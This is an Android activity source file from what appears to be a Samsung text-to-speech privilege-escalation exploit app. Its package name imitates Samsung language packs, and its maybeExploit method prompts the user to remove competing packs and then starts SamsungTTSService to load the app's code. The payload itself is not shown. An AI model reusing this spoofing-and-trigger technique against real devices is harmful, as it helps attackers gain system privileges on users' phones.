package com.samsung.SMT.lang.smtshell;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.stream.Collectors;

/**
 * We need to keep the minSdkVersion at 22 or lower, so use @RequiresApi to use newer stuff.
 * This only needs to support Android 9.0 (API 28) and higher anyway.
 */
@RequiresApi(api = Build.VERSION_CODES.N)
public class MainActivity extends AppCompatActivity {

    private TextView mTextView;
    private ListView mListView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mTextView = findViewById(R.id.text);
        mListView = findViewById(R.id.list);
    }

    @Override
    protected void onStart() {
        super.onStart();
        maybeExploit();
    }

    /**
     * This will fire when we get a response from an uninstall request. No need to check the
     *  requestCode or resultCode, since we only care about one result for now.
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Toast.makeText(this, "foo", Toast.LENGTH_SHORT).show();
        maybeExploit();
    }

    private void maybeExploit() {
        ArrayList<String> pkgs = getPackageManager()
                .getInstalledPackages(PackageManager.MATCH_ALL)
                .stream()
                .map(packageInfo -> packageInfo.packageName)
                .filter(pkgName -> pkgName.startsWith("com.samsung.SMT.lang"))
                .filter(pkgName -> !pkgName.equals(getPackageName()))
                .collect(Collectors.toCollection(ArrayList::new));

        if (pkgs.size() > 0) {
            mTextView.setText(R.string.app_conflict_prompt);
            mListView.setAdapter(new ArrayAdapter<>(this, R.layout.pkg_item, pkgs));
            mListView.setOnItemClickListener((parent, view, position, id) -> {
                String pkgName = pkgs.get(position);
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + pkgName));
                startActivityForResult(intent, 0);
            });
        } else {
            mTextView.setText(R.string.no_conflicts);
            mListView.setAdapter(null);

            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService"));
            startService(intent);
        }
    }

}
